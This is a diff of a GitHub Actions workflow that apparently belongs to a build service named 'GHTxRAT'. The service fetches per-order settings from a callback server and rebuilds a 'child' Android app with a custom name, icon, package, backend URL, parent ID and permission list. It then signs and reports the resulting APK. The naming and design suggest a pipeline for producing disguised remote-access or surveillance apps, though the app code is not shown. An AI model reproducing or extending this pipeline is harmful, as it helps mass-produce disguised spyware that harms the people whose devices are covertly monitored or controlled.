@@ -25,7 +25,7 @@ permissions:
 jobs:
   build:
     runs-on: ubuntu-latest
-    timeout-minutes: 20
+    timeout-minutes: 25
 
     steps:
       - name: Checkout
@@ -37,13 +37,59 @@ jobs:
           distribution: temurin
           java-version: '17'
 
-      - name: Set up Android SDK
-        uses: android-actions/setup-android@v2
-
-      - name: Install Android 35 toolchain
+      - name: Install Android SDK components (auto-retry versions)
         run: |
-          yes | sdkmanager --licenses >/dev/null 2>&1 || true
-          sdkmanager "platform-tools" "platforms;android-35" "build-tools;35.0.0"
+          set -e
+          export ANDROID_SDK_ROOT=/usr/local/lib/android/sdk
+          export PATH="$ANDROID_SDK_ROOT/cmdline-tools/latest/bin:$ANDROID_SDK_ROOT/cmdline-tools/bin:$ANDROID_SDK_ROOT/platform-tools:$PATH"
+
+          # Accept licenses
+          yes | sdkmanager --licenses > /dev/null 2>&1 || true
+
+          # Try SDK versions from newest to oldest — stop at first success
+          SDK_INSTALLED=false
+          TRIED=""
+
+          try_sdk() {
+            local API="$1" BT="$2"
+            echo "→ Trying platforms;android-${API} + build-tools;${BT} ..."
+            TRIED="${TRIED} android-${API}"
+            if sdkmanager --install "platform-tools" "platforms;android-${API}" "build-tools;${BT}" 2>&1; then
+              echo "SDK_API_LEVEL=${API}" >> "$GITHUB_ENV"
+              echo "BUILD_TOOLS_VERSION=${BT}" >> "$GITHUB_ENV"
+              SDK_INSTALLED=true
+              return 0
+            fi
+            return 1
+          }
+
+          try_sdk 35 35.0.0 && true || \
+          try_sdk 34 34.0.0 && true || \
+          try_sdk 33 33.0.2 && true || \
+          try_sdk 32 32.0.0 && true || \
+          try_sdk 31 31.0.0 || true
+
+          if [ "$SDK_INSTALLED" = "false" ]; then
+            # Last resort: use whatever is already installed on runner
+            INSTALLED_PLATFORM=$(ls "$ANDROID_SDK_ROOT/platforms/" 2>/dev/null | sort -rV | head -1)
+            INSTALLED_BT=$(ls "$ANDROID_SDK_ROOT/build-tools/" 2>/dev/null | sort -rV | head -1)
+            if [ -n "$INSTALLED_PLATFORM" ] && [ -n "$INSTALLED_BT" ]; then
+              API=$(echo "$INSTALLED_PLATFORM" | sed 's/android-//')
+              echo "⚠ Using pre-installed: $INSTALLED_PLATFORM / build-tools $INSTALLED_BT"
+              echo "SDK_API_LEVEL=${API}" >> "$GITHUB_ENV"
+              echo "BUILD_TOOLS_VERSION=${INSTALLED_BT}" >> "$GITHUB_ENV"
+              SDK_INSTALLED=true
+            fi
+          fi
+
+          if [ "$SDK_INSTALLED" = "false" ]; then
+            echo "✗ All SDK install attempts failed. Tried:${TRIED}"
+            exit 1
+          fi
+
+          echo "ANDROID_SDK_ROOT=$ANDROID_SDK_ROOT" >> "$GITHUB_ENV"
+          echo "ANDROID_HOME=$ANDROID_SDK_ROOT" >> "$GITHUB_ENV"
+          echo "✓ SDK ready: android-$(cat $GITHUB_ENV | grep SDK_API_LEVEL | cut -d= -f2)"
 
       - name: Set up Gradle 9.6.1
         uses: gradle/actions/setup-gradle@v4
@@ -62,14 +108,14 @@ jobs:
             "${CALLBACK_URL%/}/api/builds/${BUILD_ID}/worker?token=${BUILD_TOKEN}" \
             -o /tmp/ghtxrat-build.json
           jq -e '.buildId == env.BUILD_ID' /tmp/ghtxrat-build.json >/dev/null
-          echo "APP_NAME=$(jq -r '.appName' /tmp/ghtxrat-build.json)" >> "$GITHUB_ENV"
+          echo "APP_NAME=$(jq -r '.appName' /tmp/ghtxrat-build.json)"         >> "$GITHUB_ENV"
           echo "PACKAGE_NAME=$(jq -r '.packageName' /tmp/ghtxrat-build.json)" >> "$GITHUB_ENV"
           echo "VERSION_NAME=$(jq -r '.versionName' /tmp/ghtxrat-build.json)" >> "$GITHUB_ENV"
           echo "VERSION_CODE=$(jq -r '.versionCode' /tmp/ghtxrat-build.json)" >> "$GITHUB_ENV"
-          echo "WEBVIEW_URL=$(jq -r '.webviewUrl' /tmp/ghtxrat-build.json)" >> "$GITHUB_ENV"
-          echo "BACKEND_URL=$(jq -r '.backendUrl' /tmp/ghtxrat-build.json)" >> "$GITHUB_ENV"
-          echo "PARENT_UID=$(jq -r '.uid' /tmp/ghtxrat-build.json)" >> "$GITHUB_ENV"
-          echo "ICON_EXT=$(jq -r '.iconExt' /tmp/ghtxrat-build.json)" >> "$GITHUB_ENV"
+          echo "WEBVIEW_URL=$(jq -r '.webviewUrl' /tmp/ghtxrat-build.json)"   >> "$GITHUB_ENV"
+          echo "BACKEND_URL=$(jq -r '.backendUrl' /tmp/ghtxrat-build.json)"   >> "$GITHUB_ENV"
+          echo "PARENT_UID=$(jq -r '.uid' /tmp/ghtxrat-build.json)"           >> "$GITHUB_ENV"
+          echo "ICON_EXT=$(jq -r '.iconExt' /tmp/ghtxrat-build.json)"         >> "$GITHUB_ENV"
           jq -r '.permissions | join("|")' /tmp/ghtxrat-build.json > /tmp/permissions.txt
           jq -r '.iconBase64' /tmp/ghtxrat-build.json | base64 --decode > "/tmp/app-icon.$(jq -r '.iconExt' /tmp/ghtxrat-build.json)"
 
@@ -78,7 +124,7 @@ jobs:
           set -euo pipefail
           export PACKAGE_NAME APP_NAME VERSION_NAME VERSION_CODE WEBVIEW_URL BACKEND_URL PARENT_UID
           python3 - <<'PY'
-          import json, os, pathlib
+          import json, os, pathlib, re
           root=pathlib.Path("android/child")
           package=os.environ["PACKAGE_NAME"]
           app=os.environ["APP_NAME"]
@@ -87,82 +133,101 @@ jobs:
           webview=os.environ["WEBVIEW_URL"]
           backend=os.environ["BACKEND_URL"]
           uid=os.environ["PARENT_UID"]
-          perms=[x for x in pathlib.Path("/tmp/permissions.txt").read_text().split("|") if x]
+          sdk_api=int(os.environ.get("SDK_API_LEVEL","35"))
+          min_sdk=min(26, sdk_api)
+          perms=[x for x in pathlib.Path("/tmp/permissions.txt").read_text().strip().split("|") if x]
+
+          # Patch package name in all Kotlin files
           for p in root.glob("app/src/main/java/**/*.kt"):
               text=p.read_text()
               text=text.replace("com.rifxguard.child", package)
               p.write_text(text)
+
+          # Write BuildConfigValues.kt
           bc=root/"app/src/main/java/com/rifxguard/child/BuildConfigValues.kt"
-          bc.parent.mkdir(parents=True,exist_ok=True)
+          bc.parent.mkdir(parents=True, exist_ok=True)
           bc.write_text(f'''package {package}
 
-          object BuildConfigValues {{
-              const val WEBVIEW_URL = {json.dumps(webview)}
-              const val BACKEND_URL = {json.dumps(backend)}
-              const val PARENT_UID = {json.dumps(uid)}
-              const val APP_NAME = {json.dumps(app)}
-              val REQUESTED_PERMISSIONS = arrayOf({', '.join(json.dumps(x) for x in perms)})
-          }}
-          ''')
+object BuildConfigValues {{
+    const val WEBVIEW_URL = {json.dumps(webview)}
+    const val BACKEND_URL = {json.dumps(backend)}
+    const val PARENT_UID = {json.dumps(uid)}
+    const val APP_NAME = {json.dumps(app)}
+    val REQUESTED_PERMISSIONS = arrayOf({', '.join(json.dumps(x) for x in perms)})
+}}
+''')
+
+          # Patch AndroidManifest.xml
           manifest=root/"app/src/main/AndroidManifest.xml"
           m=manifest.read_text()
-          import re
-          m=re.sub(r'android:label="[^"]*"', 'android:label='+json.dumps(app), m, count=1)
-          m=m.replace('android:supportsRtl="true">','android:supportsRtl="true"\n        android:icon="@drawable/app_icon"\n        android:roundIcon="@drawable/app_icon">')
-          existing=''.join(f'    <uses-permission android:name="{x}"/>\n' for x in perms)
+          m=re.sub(r'package="[^"]*"', f'package="{package}"', m)
+          m=re.sub(r'android:label="[^"]*"', f'android:label={json.dumps(app)}', m, count=1)
+          extra_perms=''.join(f'    <uses-permission android:name="{x}"/>\n' for x in perms if 'INTERNET' not in x)
           marker='    <uses-permission android:name="android.permission.INTERNET"/>\n'
-          if existing and existing not in m: m=m.replace(marker, marker+existing, 1)
+          if extra_perms and extra_perms not in m:
+              m=m.replace(marker, marker+extra_perms, 1)
           manifest.write_text(m)
+
+          # Write build.gradle.kts
           gradle=root/"app/build.gradle.kts"
           gradle.write_text(f'''plugins {{
-              id("com.android.application")
-          }}
-          
-          android {{
-              namespace = {json.dumps(package)}
-              compileSdk = 35
-              defaultConfig {{
-                  applicationId = {json.dumps(package)}
-                  minSdk = 26
-                  targetSdk = 35
-                  versionCode = {version_code}
-                  versionName = {json.dumps(version_name)}
-              }}
-              signingConfigs {{
-                  create("release") {{
-                      storeFile = file(rootProject.file("release.jks"))
-                      storePassword = System.getenv("KEYSTORE_PASSWORD")
-                      keyAlias = "ghtxrat"
-                      keyPassword = System.getenv("KEYSTORE_PASSWORD")
-                  }}
-              }}
-              buildFeatures {{ buildConfig = true }}
-              buildTypes {{
-                  release {{
-                      signingConfig = signingConfigs.getByName("release")
-                      isMinifyEnabled = false
-                  }}
-                  debug {{ isMinifyEnabled = false }}
-              }}
-              compileOptions {{
-                  sourceCompatibility = JavaVersion.VERSION_17
-                  targetCompatibility = JavaVersion.VERSION_17
-              }}
-          }}
-          
-          dependencies {{
-              implementation("androidx.core:core-ktx:1.17.0")
-              implementation("androidx.activity:activity-ktx:1.11.0")
-              implementation("androidx.webkit:webkit:1.15.0")
-          }}
-          ''')
-          icon=pathlib.Path('/tmp/app-icon.'+os.environ.get('ICON_EXT','png'))
+    id("com.android.application")
+}}
+
+android {{
+    namespace = {json.dumps(package)}
+    compileSdk = {sdk_api}
+    defaultConfig {{
+        applicationId = {json.dumps(package)}
+        minSdk = {min_sdk}
+        targetSdk = {sdk_api}
+        versionCode = {version_code}
+        versionName = {json.dumps(version_name)}
+    }}
+    signingConfigs {{
+        create("release") {{
+            storeFile = file(rootProject.file("release.jks"))
+            storePassword = System.getenv("KEYSTORE_PASSWORD")
+            keyAlias = "ghtxrat"
+            keyPassword = System.getenv("KEYSTORE_PASSWORD")
+        }}
+    }}
+    buildFeatures {{ buildConfig = true }}
+    buildTypes {{
+        release {{
+            signingConfig = signingConfigs.getByName("release")
+            isMinifyEnabled = false
+        }}
+        debug {{ isMinifyEnabled = false }}
+    }}
+    compileOptions {{
+        sourceCompatibility = JavaVersion.VERSION_17
+        targetCompatibility = JavaVersion.VERSION_17
+    }}
+}}
+
+dependencies {{
+    implementation("androidx.core:core-ktx:1.17.0")
+    implementation("androidx.activity:activity-ktx:1.11.0")
+    implementation("androidx.webkit:webkit:1.15.0")
+}}
+''')
+
+          # Copy icon
+          icon_ext=os.environ.get("ICON_EXT","png")
+          icon=pathlib.Path(f'/tmp/app-icon.{icon_ext}')
           out=root/'app/src/main/res/drawable-nodpi'
-          out.mkdir(parents=True,exist_ok=True)
-          (out/'app_icon.'+os.environ.get('ICON_EXT','png')).write_bytes(icon.read_bytes())
+          out.mkdir(parents=True, exist_ok=True)
+          (out/f'app_icon.{icon_ext}').write_bytes(icon.read_bytes())
+
+          # gradle.properties
+          (root/'gradle.properties').write_text(
+              'android.builtInKotlin=true\n'
+              'android.useAndroidX=true\n'
+              'org.gradle.jvmargs=-Xmx3072m -Dfile.encoding=UTF-8\n'
+          )
           (root/'release.jks').unlink(missing_ok=True)
-          (root/'gradle.properties').write_text('android.builtInKotlin=true\nandroid.useAndroidX=true\norg.gradle.jvmargs=-Xmx3072m -Dfile.encoding=UTF-8\n')
-          print('Patched:', package, app, version_name, version_code)
+          print(f'Patched OK: {package} / {app} / v{version_name} / uid={uid}')
           PY
 
       - name: Generate release keystore
@@ -171,12 +236,13 @@ jobs:
           KEYSTORE_PASSWORD: ${{ secrets.GHTXRAT_KEYSTORE_PASSWORD }}
         run: |
           set -euo pipefail
-          if [ -z "${KEYSTORE_PASSWORD}" ]; then KEYSTORE_PASSWORD="${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}-ghtxrat"; fi
-          echo "KEYSTORE_PASSWORD=${KEYSTORE_PASSWORD}" >> "$GITHUB_ENV"
+          KP="${KEYSTORE_PASSWORD:-}"
+          if [ -z "$KP" ]; then KP="${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}-ghtxrat"; fi
+          echo "KEYSTORE_PASSWORD=$KP" >> "$GITHUB_ENV"
           keytool -genkeypair -v \
             -keystore release.jks \
-            -storepass "${KEYSTORE_PASSWORD}" \
-            -keypass "${KEYSTORE_PASSWORD}" \
+            -storepass "$KP" \
+            -keypass "$KP" \
             -alias ghtxrat \
             -keyalg RSA -keysize 2048 -validity 10000 \
             -dname "CN=GHTxRAT, OU=GHTxRAT, O=GHTxRAT, L=Internet, ST=NA, C=ID"
@@ -225,7 +291,7 @@ jobs:
           BUILD_TOKEN: ${{ inputs.build_token }}
         run: |
           set +e
-          curl --fail --silent --show-error --location \
+          curl --silent --location \
             --max-time 30 \
             -X POST "${CALLBACK_URL%/}/api/builds/${BUILD_ID}/worker-failed" \
             -H "X-Build-Token: ${BUILD_TOKEN}" \
